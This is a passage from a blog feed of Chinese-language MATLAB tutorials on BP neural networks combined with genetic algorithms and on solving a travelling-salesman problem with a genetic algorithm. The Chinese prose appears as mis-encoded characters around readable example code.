href="#ä¸é—ä¼ ç®—æ³•ç»“åˆ" class="headerlink" title="ä¸é—ä¼ ç®—æ³•ç»“åˆ"></a>ä¸é—ä¼ ç®—æ³•ç»“åˆ</h2><p>è¿˜è®°å¾—ä»¥å‰ä»‹ç»çš„é—ä¼ ç®—æ³•å˜›?æ³¨æ„åˆ°EzBPçš„ç¬¬ä¸‰ä¸ªå‚æ•°äº†å˜›?æ²¡é”™,è¿™å°±æ˜¯ç»™é—ä¼ ç®—æ³•å‡†å¤‡çš„.å…¶å®,åœ¨åˆå§‹åŒ–ç¥ç»ç½‘ç»œæ—¶,æ¯ä¸ªç¥ç»å…ƒéƒ½æœ‰ä¸€ä¸ªåˆå§‹çš„å€¼[-0.5,0.5],å¦‚æœç”¨é—ä¼ ç®—æ³•å¯¹è¿™ä¸ªè¿›è¡Œä¼˜åŒ–,å°±ä¼šå¯¹ç»“æœé€ æˆå½±å“.(å®é™…æ•ˆæœä¸å¥½).</p><p><code>demo.m</code>:</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">x1=[<span class="number">1</span>:<span class="number">3</span>:<span class="number">20</span>]';</span><br><span class="line">x2=[<span class="number">1</span>:<span class="number">3</span>:<span class="number">20</span>]';</span><br><span class="line">x=[x1,x2];</span><br><span class="line"></span><br><span class="line">y=x1.^<span class="number">2</span>+x2.^<span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">[net,is,os]=GABP(x,y);</span><br><span class="line"></span><br><span class="line">testNum=[<span class="number">11</span>,<span class="number">11</span>]';</span><br><span class="line"></span><br><span class="line"><span class="comment">%è¾“å…¥å€¼å½’ä¸€åŒ–</span></span><br><span class="line">inputNum=mapminmax(<span class="string">'apply'</span>,testNum,is);</span><br><span class="line"><span class="comment">%æ”¾å…¥ç¥ç»ç½‘ç»œ,è¿›è¡Œè®¡ç®—</span></span><br><span class="line">outputNum=net(inputNum);</span><br><span class="line"><span class="comment">%å°†ç¥ç»ç½‘ç»œçš„å€¼åå½’ä¸€åŒ–</span></span><br><span class="line">res=mapminmax(<span class="string">'reverse'</span>,outputNum,os)</span><br></pre></td></tr></table></figure><p><code>GABP.m</code>:</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="params">[net,ps,ts,perf]</span>=<span class="title">GABP</span><span class="params">(P,T)</span></span></span><br><span class="line">    inputNum=<span class="built_in">size</span>(P,<span class="number">2</span>);</span><br><span class="line">    outputNum=<span class="built_in">size</span>(T,<span class="number">2</span>);</span><br><span class="line">    P_T=[P T];</span><br><span class="line">    [train,test]=ChooseData(P_T);</span><br><span class="line">    trainX=train(:,<span class="number">1</span>:inputNum);</span><br><span class="line">    trainY=train(:,inputNum+<span class="number">1</span>:<span class="keyword">end</span>);</span><br><span class="line">    testX=test(:,<span class="number">1</span>:inputNum);</span><br><span class="line">    testY=test(:,inputNum+<span class="number">1</span>:<span class="keyword">end</span>);</span><br><span class="line">    hiddenNum=<span class="number">2</span>*inputNum+<span class="number">1</span>;</span><br><span class="line">    w1num=inputNum*hiddenNum;</span><br><span class="line">    w2num=outputNum*hiddenNum;</span><br><span class="line">    N=w1num+hiddenNum+w2num+outputNum;</span><br><span class="line"></span><br><span class="line">    bound=<span class="built_in">repmat</span>([<span class="number">-0.5</span> <span class="number">0.5</span>],N,<span class="number">1</span>);</span><br><span class="line">    [best,x]=EzGA(bound,@fun,<span class="number">20</span>,&#123;trainX,trainY,testX,testY&#125;);</span><br><span class="line">    [net,ps,ts,perf]=EzBP(trainX,trainY,x,testX,testY);</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>ç¥ç»ç½‘ç»œç®—æ³•æ˜¯ä¸€å¥—å†å²æ‚ ä¹…ä¹Ÿæ¯”è¾ƒæˆç†Ÿçš„æœºå™¨å­¦ä¹ ç®—æ³•.æ˜¯å¯¹ä»˜æ•°å€¼åˆ†æé—®é¢˜çš„æœ€åæ€æ‰‹é”.æˆ‘ä»¬ä¸€èˆ¬æ¯”è¾ƒå¸¸ç”¨çš„ä¸€ç§ç¥ç»ç½‘ç»œæ˜¯BPç¥ç»ç½‘ç»œ.æœ¬æ–‡ä¹Ÿä»¥BPç¥ç»ç½‘ç»œçš„ä½¿ç”¨åŠå…¶ä¼˜åŒ–è¿›è¡Œäº†è¯¦ç»†è®²è§£,åŒæ—¶æä¾›äº†å¯è°ƒç”¨çš„å‡½æ•°åŸå‹.<br>ä½†æƒ³è¦å¾—åˆ°è¾ƒå¥½æ•ˆæœ,è¿˜å»ºè®®å­¦ä¹ å…¶ä»–çš„ä¸€äº›ç¥ç»ç½‘ç»œ,äº†è§£å…¶å„è‡ªä¼˜åŠ¿.ä½†ç”±äºè¿™ä¸€ç±»ç®—æ³•æ™®éç¨³å®šæ€§è¾ƒå·®,å¦‚æœä¸æ˜¯ä¸‡ä¸å¾—å·²,æˆ–æ˜¯æ•ˆæœè¶…ç¾¤,ä¸å»ºè®®ä½¿ç”¨.åŒæ—¶,è‹¥è¦ä½¿ç”¨æ­¤ç®—æ³•,è¯·åŠ¡å¿…æŠ½å‡ºä¸€éƒ¨åˆ†æ ·æœ¬ç”¨æ¥æ£€éªŒ(<strong>ä¸¥ç¦æ‹¿ç»“æœç›´æ¥æ¥å­¦ä¹ ,ç„¶åè¿”å›ç»“æœ!!</strong>)</p><p>å…¶ç®—æ³•ä¼˜åŠ£åˆ†æå¦‚ä¸‹(ç¬”è€…è®¤ä¸º):<br>ä¼˜ç‚¹:</p><ol><li>æ‰€é€‚ç”¨çš„ç±»å‹å¹¿æ³›.å¦‚æœä¼˜åŒ–çš„å¥½,å‡ ä¹å¯ä»¥è§£å†³æ¯”èµ›ä¸­é‡åˆ°çš„å„ç§é—®é¢˜.e.g.æ’å€¼,æ‹Ÿåˆ,èšç±».</li><li>å¯¹éçº¿æ€§æ•°æ®çš„æ‹Ÿåˆæ•ˆæœä¼˜å¼‚.å®åœ¨æ²¡çœ‹å‡ºæ•°æ®æœ‰å•¥è§„å¾‹,ç¥ç»ç½‘ç»œè‡³å°‘ç®—æ˜¯ä¸€ç§è§£å†³æ–¹æ³•.</li></ol><p>ç¼ºç‚¹:</p><ol><li>éœ€è¦å¤§é‡çš„æ ·æœ¬æ•°æ®</li></ol><p>æºç¨‹åº: <a href="https://github.com/Anemone95/matlab-nnet" target="_blank" rel="noopener">https://github.com/Anemone95/matlab-nnet</a></p>]]></content>
      
      
      <categories>
          
          <category> æ•°å­¦å»ºæ¨¡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æœºå™¨å­¦ä¹  </tag>
            
            <tag> ç®—æ³• </tag>
            
            <tag> äººå·¥æ™ºèƒ½ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é—ä¼ ç®—æ³•â€”â€”å¦ä¸€ä¸ªæ±‚æœ€ä¼˜è§£çš„æ™ºèƒ½ç®—æ³•</title>
      <link href="/%E6%95%B0%E6%A8%A1-%E9%81%97%E4%BC%A0%E7%AE%97%E6%B3%95%E2%80%94%E2%80%94%E5%8F%A6%E4%B8%80%E4%B8%AA%E6%B1%82%E6%9C%80%E4%BC%98%E8%A7%A3%E7%9A%84%E6%99%BA%E8%83%BD%E7%AE%97%E6%B3%95/"/>
      <url>/%E6%95%B0%E6%A8%A1-%E9%81%97%E4%BC%A0%E7%AE%97%E6%B3%95%E2%80%94%E2%80%94%E5%8F%A6%E4%B8%80%E4%B8%AA%E6%B1%82%E6%9C%80%E4%BC%98%E8%A7%A3%E7%9A%84%E6%99%BA%E8%83%BD%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>é—ä¼ ç®—æ³•æ˜¯æ±‚è§£è¿‘ä¼¼æœ€ä¼˜è§£çš„æœ€å…·ä»£è¡¨æ€§çš„æ™ºèƒ½ç®—æ³•ä¹‹ä¸€ï¼Œå¦‚ä»Šçš„å¾ˆå¤šæ–¹æ³•éƒ½å¯ä»¥çœ‹åˆ°å®ƒçš„å½±å­ï¼Œæ¯”å¦‚è¯´ä¹‹å‰åœ¨ç ”ç©¶çš„åŸºäºè¦†ç›–ç‡çš„fuzzæµ‹è¯•ï¼Œå…¶ä¸­çš„è¾“å…¥å˜å¼‚å°±ç±»ä¼¼äºé—ä¼ ç®—æ³•ï¼Œæ•…ä»æ—§åšå®¢æ¬è¿æ¥ã€‚</p><h1 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h1><p>é—ä¼ ç®—æ³•åœ¨å¤–éƒ¨ä½“ç°åŒæ¨¡æ‹Ÿé€€ç«ä¸€æ ·,ä¹Ÿæ˜¯å±äºä¼˜åŒ–é—®é¢˜çš„ä¸€ä¸ªæ±‚è§£å™¨.ä½†ç”±äºå…¶ä¼˜å¼‚çš„æ”¶æ•›é€Ÿåº¦å’Œæ¯”æ¨¡æ‹Ÿé€€ç«æ›´ä¼˜ç§€çš„ç»“æœ,åœ¨å¯¹ç»“æœè¦æ±‚é«˜çš„é¢˜ç›®ä¸Š,å®ƒä¹Ÿæˆä¸ºæˆ‘ä»¬æ±‚è§£é—®é¢˜çš„å¸¸ç”¨æ–¹æ³•.</p><a id="more"></a><p><img src="/æ•°æ¨¡-é—ä¼ ç®—æ³•â€”â€”å¦ä¸€ä¸ªæ±‚æœ€ä¼˜è§£çš„æ™ºèƒ½ç®—æ³•/ga-1545742951220.jpg" alt="ga"></p><h1 id="å¿«é€Ÿä½¿ç”¨"><a href="#å¿«é€Ÿä½¿ç”¨" class="headerlink" title="å¿«é€Ÿä½¿ç”¨"></a>å¿«é€Ÿä½¿ç”¨</h1><p>é—ä¼ ç®—æ³•åœ¨å®ç°ä¸Šæ¯”æ¨¡æ‹Ÿé€€ç«è¦å¤æ‚å¾ˆå¤š,ä½†è‹¥ä¸å…³å¿ƒå…¶å†…éƒ¨ç®—æ³•,ä½¿ç”¨ä¸Šåè€Œæ¯”æ¨¡æ‹Ÿé€€ç«è¦ç®€å•.</p><h2 id="è¿ç»­å‹éšæœºå˜é‡"><a href="#è¿ç»­å‹éšæœºå˜é‡" class="headerlink" title="è¿ç»­å‹éšæœºå˜é‡"></a>è¿ç»­å‹éšæœºå˜é‡</h2><p><strong>æ¡ˆä¾‹ä¸€:</strong>æ±‚<code>min(x^2+y^2),x,yâˆˆ[-1e5,1e5]</code>:</p><ol><li><p>å¤åˆ¶<code>GANorm</code>æ–‡ä»¶å¤¹åˆ°ä½ çš„å·¥ä½œç›®å½•.</p></li><li><p>åŒæ–‡ä»¶å¤¹ä¸‹æ–°å»º<code>demo.m</code>æ–‡ä»¶,è¾“å…¥:</p> <figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">y=@(x)x(<span class="number">1</span>)^<span class="number">2</span>+x(<span class="number">2</span>)^<span class="number">2</span>;</span><br><span class="line">[best,x]=EzGA([<span class="number">-1e5</span> <span class="number">1e5</span>;<span class="number">-1e5</span> <span class="number">1e5</span>],y)</span><br></pre></td></tr></table></figure></li><li><p>è¿è¡Œ<code>demo.m</code>æ–‡ä»¶,å¾—åˆ°ä»è¿è¡ŒåŠç»“æœ:</p> <figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sizepop =</span><br><span class="line">        <span class="number">1000</span></span><br><span class="line">best =</span><br><span class="line">    <span class="number">3.9901</span></span><br><span class="line">x =</span><br><span class="line">    <span class="number">1.9975</span>   <span class="number">-0.0001</span></span><br></pre></td></tr></table></figure><p> æ²¡é”™,ç®€å•çš„é—ä¼ ç®—æ³•å‡½æ•°çš„è°ƒç”¨å½¢å¼ä¸ºEzGA(å˜é‡ä¸Šä¸‹é™,ç›®æ ‡å‡½æ•°å¥æŸ„[,åˆå§‹ç§ç¾¤æ•°é‡=500,é™„åŠ æ•°æ®]),æ³¨æ„ç¬¬ä¸‰ä¸ª,ç¬¬å››ä¸ªå˜é‡ä¸ºå¯é€‰å‚æ•°.</p></li></ol><p><strong>æ¡ˆä¾‹äºŒ:</strong>æ±‚<code>min(0.7*x(1)+0.8*x(2)),x,yâˆˆ[-1e5,1e5]</code>:</p><ol><li><p>å¤åˆ¶<code>GANorm</code>æ–‡ä»¶å¤¹åˆ°ä½ çš„å·¥ä½œç›®å½•.</p></li><li><p>åŒæ–‡ä»¶å¤¹ä¸‹æ–°å»º<code>demo2.m</code>æ–‡ä»¶,è¾“å…¥:</p> <figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[best,x]=EzGA([<span class="number">-1e5</span> <span class="number">1e5</span>;<span class="number">-1e5</span> <span class="number">1e5</span>],@OptFun,<span class="number">1e2</span>,[<span class="number">0.7</span> <span class="number">0.8</span>])</span><br></pre></td></tr></table></figure></li><li><p>åŒæ–‡ä»¶å¤¹ä¸‹æ–°å»º<code>OptFun.m</code>æ–‡ä»¶,è¾“å…¥:</p> <figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">y</span>=<span class="title">OptFun</span><span class="params">(x,coe)</span></span></span><br><span class="line">    y=coe(<span class="number">1</span>)*x(<span class="number">1</span>)^<span class="number">2</span>+coe(<span class="number">2</span>)*x(<span class="number">2</span>)^<span class="number">2</span>;</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></li><li><p>è¿è¡Œ<code>demo2.m</code>æ–‡ä»¶,å¾—åˆ°ä»è¿è¡ŒåŠç»“æœ:</p> <figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sizepop =</span><br><span class="line">   <span class="number">100</span></span><br><span class="line">best =</span><br><span class="line">   <span class="number">1.1761e-07</span></span><br><span class="line">x =</span><br><span class="line">   <span class="number">1.0e-03</span> *</span><br><span class="line">   <span class="number">-0.0079</span>    <span class="number">0.3834</span></span><br></pre></td></tr></table></figure></li></ol><h1 id="åŸç†è®²è§£"><a href="#åŸç†è®²è§£" class="headerlink" title="åŸç†è®²è§£"></a>åŸç†è®²è§£</h1><p>ä»¥ä¸‹ç»“åˆæ¡ˆä¾‹,æ¥è§£é‡Šä¸€ä¸‹é—ä¼ ç®—æ³•çš„å…·ä½“å®ç°.</p><h2 id="è¿ç»­å‹éšæœºå˜é‡-TSPé—®é¢˜"><a href="#è¿ç»­å‹éšæœºå˜é‡-TSPé—®é¢˜" class="headerlink" title="è¿ç»­å‹éšæœºå˜é‡(TSPé—®é¢˜)"></a>è¿ç»­å‹éšæœºå˜é‡(TSPé—®é¢˜)</h2><p>ä¸‹é¢åˆæ˜¯æˆ‘ä»¬çš„æ—…è¡Œå•†é—®é¢˜,åŒæ ·,æˆ‘ä»¬æœ‰å›¾(*ä»£è¡¨åŸé•‡):<br><img src="/æ•°æ¨¡-é—ä¼ ç®—æ³•â€”â€”å¦ä¸€ä¸ªæ±‚æœ€ä¼˜è§£çš„æ™ºèƒ½ç®—æ³•/graph.jpg" alt="graph"></p><p>é¦–å…ˆ,ç»“åˆæµç¨‹å›¾,æˆ‘ä»¬é¦–å…ˆå†™ä¸»å‡½æ•°è°ƒç”¨é—ä¼ ç®—æ³•<code>GATSP</code><br><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">%è®°å½•äº†åŸé•‡çš„åæ ‡</span></span><br><span class="line">X=[</span><br><span class="line"><span class="number">16.47</span>,<span class="number">96.10</span></span><br><span class="line"><span class="number">16.47</span>,<span class="number">94.44</span></span><br><span class="line"><span class="number">20.09</span>,<span class="number">92.54</span></span><br><span class="line"><span class="number">22.39</span>,<span class="number">93.37</span></span><br><span class="line"><span class="number">25.23</span>,<span class="number">97.24</span></span><br><span class="line"><span class="number">22.00</span>,<span class="number">96.05</span></span><br><span class="line"><span class="number">20.47</span>,<span class="number">97.02</span></span><br><span class="line"><span class="number">17.29</span>,<span class="number">96.29</span></span><br><span class="line"><span class="number">16.30</span>,<span class="number">97.38</span></span><br><span class="line"><span class="number">14.05</span>,<span class="number">98.12</span></span><br><span class="line"><span class="number">16.53</span>,<span class="number">97.38</span></span><br><span class="line"><span class="number">21.52</span>,<span class="number">95.59</span></span><br><span class="line"><span class="number">20.09</span>,<span class="number">92.55</span>];</span><br><span class="line">D=Distance(X); <span class="comment">%å–å¾—é‚»æ¥çŸ©é˜µ</span></span><br><span class="line">N=<span class="built_in">size</span>(D,<span class="number">1</span>);    <span class="comment">%åŸé•‡æ•°</span></span><br><span class="line"><span class="comment">%è°ƒç”¨é—ä¼ ç®—æ³•</span></span><br><span class="line">[obj,x]=GATSP(N,D);</span><br></pre></td></tr></table></figure></p><p>é—ä¼ ç®—æ³•ä¸»å‡½æ•°:<br><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="params">[minObj,x]</span>=<span class="title">GATSP</span><span class="params">(N,attach,NIND)</span></span></span><br><span class="line"></span><br><span class="line">    MAXGEN=<span class="number">200</span>;</span><br><span class="line">    <span class="keyword">if</span> nargin&lt;<span class="number">3</span></span><br><span class="line">        NIND=<span class="number">100</span>;</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    Pc=<span class="number">0.9</span>;</span><br><span class="line">    Pm=<span class="number">0.2</span>;</span><br><span class="line">    GGAP=<span class="number">0.9</span>;</span><br><span class="line"></span><br><span class="line">    Chrom=InitPop(NIND,N);</span><br><span class="line">    <span class="comment">% Rlength=PathLength(D,Chrom(1,:));</span></span><br><span class="line">    gen=<span class="number">0</span>;</span><br><span class="line">    <span class="comment">% ObjV=PathLength(D,Chrom);</span></span><br><span class="line">    <span class="comment">% preObjV=min(ObjV);</span></span><br><span class="line">    history=[];</span><br><span class="line">    h=waitbar(<span class="number">0</span>,<span class="string">'Evolving....'</span>);</span><br><span class="line">    <span class="keyword">while</span> gen&lt;MAXGEN</span><br><span class="line">        ObjV=PathLength(attach,Chrom);</span><br><span class="line">    <span class="comment">%    min(ObjV)</span></span><br><span class="line">        FitnV=Fitness(ObjV);</span><br><span class="line">        SelCh=Select(Chrom,FitnV,GGAP);</span><br><span class="line">        SelCh=Recombin(SelCh,Pc);</span><br><span class="line">        SelCh=Mutate(SelCh,Pm);</span><br><span class="line">        SelCh=Reverse(SelCh,attach);</span><br><span class="line">        Chrom=Reins(Chrom,SelCh,ObjV);</span><br><span class="line">        history=[history <span class="built_in">min</span>(ObjV)];</span><br><span class="line">        gen=gen+<span class="number">1</span>;</span><br><span class="line">        waitbar(gen/MAXGEN,h,sprintf(<span class="string">'Now Generation:%d'</span>,gen));</span><br><span class="line">        <span class="keyword">if</span> gen&gt;<span class="number">30</span></span><br><span class="line">            <span class="keyword">if</span> sum(diff(history(<span class="keyword">end</span><span class="number">-30</span>:<span class="keyword">end</span>)))==<span class="number">0</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    close(h)</span><br><span class="line"></span><br><span class="line">    ObjV=PathLength(attach,Chrom);</span><br><span class="line">    <span class="built_in">plot</span>(history)</span><br><span class="line">    title(<span class="string">'Fitness curve'</span>,<span class="string">'fontsize'</span>,<span class="number">12</span>);</span><br><span class="line">    xlabel(<span class="string">'Evolutionary generation'</span>,<span class="string">'fontsize'</span>,<span class="number">12</span>);ylabel(<span class="string">'Option'</span>,<span class="string">'fontsize'</span>,<span class="number">12</span>);</span><br><span class="line">    <span class="comment">% axis([0,MAXGEN,0,1])</span></span><br><span class="line"></span><br><span class="line">    [minObj,minInd]=<span class="built_in">min</span>(ObjV);</span><br><span class="line">    x=Chrom(minInd,:);</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p><h2 id="åˆå§‹åŒ–ç§ç¾¤"><a href="#åˆå§‹åŒ–ç§ç¾¤" class="headerlink" title="åˆå§‹åŒ–ç§ç¾¤"></a>åˆå§‹åŒ–ç§ç¾¤</h2><p>åˆå§‹åŒ–ç§ç¾¤å®é™…å°±æ˜¯äº§ç”ŸNINDä¸ªç¬¦åˆè¦æ±‚çš„è§£.<code>InitPop.m</code>:<br><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Chrom</span>=<span class="title">InitPop</span><span class="params">(NIND,N)</span></span></span><br><span class="line">    <span class="comment">%NIND ç§ç¾¤å¤§å°</span></span><br><span class="line">    <span class="comment">%N å•ä¸ªæŸ“è‰²ä½“é•¿åº¦(åŸå¸‚ä¸ªæ•°)</span></span><br><span class="line">    Chrom=<span class="built_in">zeros</span>(NIND,N);</span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">i</span>=<span class="number">1</span>:NIND</span><br><span class="line">        Chrom(<span class="built_in">i</span>,:)=randperm(N); <span class="comment">%éšæœºäº§ç”Ÿç§ç¾¤</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p><h2 id="é€‚åº”åº¦å‡½æ•°"><a href="#é€‚åº”åº¦å‡½æ•°" class="headerlink" title="é€‚åº”åº¦å‡½æ•°"></a>é€‚åº”åº¦å‡½æ•°</h2><p>TSPçš„è¦æ±‚æ˜¯è·¯ç¨‹æœ€çŸ­,è€Œé€‚åº”åº¦å‡½æ•°è§†å€¼è¶Šå¤§è¶Šä¼˜,æ‰€ä»¥æˆ‘ä»¬è¿™é‡Œå…ˆè®¡ç®—å‡ºé•¿åº¦å,å†å¯¹å…¶å–å.</p><p><code>PathLength.m</code>:<br><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">len</span>=<span class="title">PathLength</span><span class="params">(graph,Chrom)</span></span></span><br><span class="line">    [row,col]=<span class="built_in">size</span>(graph);</span><br><span class="line">    NIND=<span class="built_in">size</span>(Chrom,<span class="number">1</span>);</span><br><span class="line">    len=<span class="built_in">zeros</span>(NIND,<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">i</span>=<span class="number">1</span>:NIND</span><br><span class="line">        <span class="comment">% path</span></span><br><span class="line">        p=[Chrom(<span class="built_in">i</span>,:) Chrom(<span class="built_in">i</span>,<span class="number">1</span>)];</span><br><span class="line">        i1=p(<span class="number">1</span>:<span class="keyword">end</span><span class="number">-1</span>);</span><br><span class="line">        i2=p(<span class="number">2</span>:<span class="keyword">end</span>);</span><br><span class="line">        len(<span class="built_in">i</span>,<span class="number">1</span>)=sum(graph((i1<span class="number">-1</span>)*col+i2));<span class="comment">% âˆ‘graph(from,to)</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p><p><code>Fitness.m</code>:<br><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">FitnV</span>=<span class="title">Fitness</span><span class="params">(len)</span></span></span><br><span class="line">    <span class="comment">% len ä¸ªä½“é•¿åº¦</span></span><br><span class="line">    FitnV=<span class="number">1.</span>/len;</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p><h2 id="é€‰æ‹©æ“ä½œ"><a href="#é€‰æ‹©æ“ä½œ" class="headerlink" title="é€‰æ‹©æ“ä½œ"></a>é€‰æ‹©æ“ä½œ</h2><p>æ¨¡æ‹Ÿè‡ªç„¶é€‰æ‹©,å®é™…ä¸Šå°±æ˜¯æŒ‡é€‚åº”åº¦è¶Šå¥½çš„è§£è¢«ç•™ä¸‹æ¥çš„å‡ ç‡è¶Šå¤§(ä½†ä¹Ÿä¸æ˜¯è¯´é€‚åº”åº¦ä¸å¥½çš„è§£ä¸è¢«ç•™ä¸‹).<br><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SelCh</span>=<span class="title">Select</span><span class="params">(Chrom,FitnV,GGAP)</span></span></span><br><span class="line">    <span class="comment">%ç§ç¾¤ é€‚åº”å€¼ é€‰æ‹©æ¦‚ç‡ è¢«é€‰æ‹©ä¸ªä½“</span></span><br><span class="line">    NIND=<span class="built_in">size</span>(Chrom,<span class="number">1</span>);</span><br><span class="line">    NSel=<span class="built_in">max</span>(<span class="built_in">floor</span>(NIND*GGAP+<span class="number">0.5</span>),<span class="number">2</span>);</span><br><span class="line">    Chrlx=Sus(FitnV,NSel);</span><br><span class="line">    SelCh=Chrom(Chrlx,:);</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">NewChrlx</span>=<span class="title">Sus</span><span class="params">(FitnV,NSel)</span></span></span><br><span class="line">    <span class="comment">%é€‚åº”å€¼ æ•°ç›®</span></span><br><span class="line">    <span class="comment">%å¤‡é€‰ç´¢å¼•</span></span><br><span class="line">    [Nind,ans_]=<span class="built_in">size</span>(FitnV);</span><br><span class="line">    cumfit=cumsum(FitnV);</span><br><span class="line">    trials=cumfit(Nind)/NSel*(<span class="built_in">rand</span>+(<span class="number">0</span>:NSel<span class="number">-1</span>)');</span><br><span class="line">    Mf=cumfit(:,<span class="built_in">ones</span>(<span class="number">1</span>,NSel));</span><br><span class="line">    Mt=trials(:,<span class="built_in">ones</span>(<span class="number">1</span>,Nind))';</span><br><span class="line">    [NewChrlx,ans_]=<span class="built_in">find</span>(Mt&lt;Mf&amp;[<span class="built_in">zeros</span>(<span class="number">1</span>,NSel);Mf(<span class="number">1</span>:Nind<span class="number">-1</span>,:)]&lt;=Mt);</span><br><span class="line">    [ans_,shuf]=<span class="built_in">sort</span>(<span class="built_in">rand</span>(NSel,<span class="number">1</span>));</span><br><span class="line">    NewChrlx=NewChrlx(shuf);</span><br><span class="line"><span 